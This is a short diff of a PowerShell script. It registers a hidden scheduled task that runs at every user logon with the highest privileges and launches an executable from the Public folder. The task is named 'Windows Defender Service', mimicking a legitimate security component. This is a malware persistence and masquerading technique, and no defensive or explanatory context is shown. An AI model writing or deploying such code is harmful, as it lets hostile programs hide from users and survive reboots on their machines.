@@ -1,14 +1,11 @@
-$TaskName = "Windows Defender Service" # Changed task name
-$ExePath = "C:\Windows\Windows Defender Service.exe" # Replace with your EXE path
-
-$Action = New-ScheduledTaskAction -Execute $ExePath
+$TaskName = "Windows Defender Service"
+$FilePath = "C:\users\Public\Windows Defender Service.exe"
+$Action = New-ScheduledTaskAction -Execute $PythonWPath -Argument $FilePath
 
 # Trigger at log on of any user
-$LogonTrigger = New-ScheduledTaskTrigger -AtLogOn
+$Trigger = New-ScheduledTaskTrigger -AtLogOn
 
-$Trigger = $LogonTrigger
-
-$Settings = New-ScheduledTaskSettingsSet -Hidden -WakeToRun
+$Settings = New-ScheduledTaskSettingsSet -Hidden
 
 # Use the current user's credentials
 $Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest
